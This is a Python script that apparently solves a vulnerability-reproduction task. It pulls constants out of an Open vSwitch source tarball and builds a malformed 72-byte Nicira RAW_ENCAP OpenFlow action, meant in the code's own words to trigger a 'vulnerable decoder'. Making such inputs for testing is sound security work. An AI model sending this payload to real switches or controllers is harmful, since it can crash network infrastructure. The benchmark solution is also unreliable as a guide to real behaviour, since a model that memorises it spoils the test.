import os
import re
import tarfile
import tempfile
import struct

class Solution:
    def _extract_tar(self, src_path):
        tmpdir = tempfile.mkdtemp(prefix="src_")
        try:
            with tarfile.open(src_path, 'r:*') as tf:
                tf.extractall(tmpdir)
        except Exception:
            # If src_path is a directory already
            return src_path
        return tmpdir

    def _read_text(self, path):
        try:
            with open(path, 'r', errors='ignore') as f:
                return f.read()
        except Exception:
            return ""

    def _iter_files(self, root):
        for base, _, files in os.walk(root):
            for name in files:
                yield os.path.join(base, name)

    def _find_constant(self, root, names, regexes):
        # Search for constant value in code, return first parsed integer
        for p in self._iter_files(root):
            text = self._read_text(p)
            if not text:
                continue
            for name in names:
                # Try #define NAME <value>
                m = re.search(r'#\s*define\s+' + re.escape(name) + r'\s+([0-9xXa-fA-F]+)', text)
                if m:
                    try:
                        return int(m.group(1), 0)
                    except Exception:
                        pass
                # Try enum style: NAME = <value>
                m = re.search(r'\b' + re.escape(name) + r'\s*=\s*([0-9xXa-fA-F]+)', text)
                if m:
                    try:
                        return int(m.group(1), 0)
                    except Exception:
                        pass
            # Try custom regex patterns
            for r in regexes:
                m = re.search(r, text)
                if m:
                    try:
                        return int(m.group(1), 0)
                    except Exception:
                        pass
        return None

    def _find_vendor_id(self, root):
        # Nicira vendor id constants across versions
        # Common names: NX_VENDOR_ID, NICIRA_VENDOR_ID
        val = self._find_constant(root,
                                  names=["NX_VENDOR_ID", "NICIRA_VENDOR_ID"],
                                  regexes=[r'NX\s*[,=]\s*([0-9xXa-fA-F]+)'])
        if val is None:
            # Default to known Nicira vendor ID
            val = 0x2320
        return val

    def _find_raw_encap_subtype(self, root):
        # Try to find NXAST_RAW_ENCAP subtype number
        # Common in include/openflow/nicira-ext.h as enum nx_action_subtype
        val = self._find_constant(root,
                                  names=["NXAST_RAW_ENCAP"],
                                  regexes=[r'NXAST_RAW_ENCAP\s*=\s*([0-9xXa-fA-F]+)'])
        if val is not None:
            return val
        # Sometimes defined as NXAST_RAW_ENCAP = OFPAT12_EXPERIMENTER+...
        # Fallback to searching enum listing with ordinal positions (hard).
        # As a last resort, return a likely value; values vary around 46-60 in some OVS versions.
        return 46

    def solve(self, src_path: str) -> bytes:
        root = self._extract_tar(src_path)
        vendor_id = self._find_vendor_id(root)
        subtype = self._find_raw_encap_subtype(root)

        # Build a Nicira (NX) vendor action header (OpenFlow 1.0 style)
        # struct nx_action_header {
        #   uint16_t type = OFPAT_VENDOR (0xffff);
        #   uint16_t len;          // total length including header
        #   uint32_t vendor;       // Nicira vendor ID (0x2320)
        #   uint16_t subtype;      // NXAST_RAW_ENCAP
        #   uint8_t  pad[6];       // zero
        # };
        # Follow with bytes to total 72 length. The content after header is crafted to be non-empty
        # to force decoding of properties in vulnerable decoder.
        total_len = 72
        header_len = 16
        remaining = total_len - header_len

        # Some decoders may expect fields after header. We attempt to supply a plausible minimal
        # layout: ethertype (2), reserved (2), props_len (2), pad (2), and a TLV-like property header
        # followed by bytes. If this exceeds remaining, we will just fill zeros.
        # Try a simple property TLV: class(2)=0, type(1)=0, len(1)=remaining-8 truncated to byte,
        # then 4 bytes of zeros for alignment, rest zeros.
        # But to keep deterministic 72 bytes, we fill remaining bytes with a pattern.

        # Pack nx_action_header
        buf = bytearray()
        buf += struct.pack("!HHI", 0xFFFF, total_len, vendor_id)
        buf += struct.pack("!H", subtype)
        buf += b"\x00" * 6  # pad

        # Body: attempt to resemble fields to encourage deeper decode paths.
        body = bytearray()

        # ethertype: use IPv4
        body += struct.pack("!H", 0x0800)
        # reserved/pad
        body += b"\x00\x00"
        # props length guess
        body += struct.pack("!H", max(0, remaining - 8))
        # pad
        body += b"\x00\x00"

        # Simple TLV-like property header (4 bytes), followed by data
        # class (2) = 0, type (1) = 0, len (1) = remaining - current_length - 4
        tlv_space = remaining - len(body)
        if tlv_space >= 4:
            tlv_len = max(0, min(255, tlv_space - 4))
            body += struct.pack("!HB", 0, 0)
            body += struct.pack("!B", tlv_len)
            # data
            body += b"\x41" * tlv_len  # 'A' bytes
            # any trailing space fill with zeros
            if len(body) < remaining:
                body += b"\x00" * (remaining - len(body))
        else:
            # Not enough space, just pad zeros
            body += b"\x00" * (remaining - len(body))

        buf += body[:remaining]
        # Ensure total length exactly 72
        buf = bytes(buf[:total_len])
        return buf
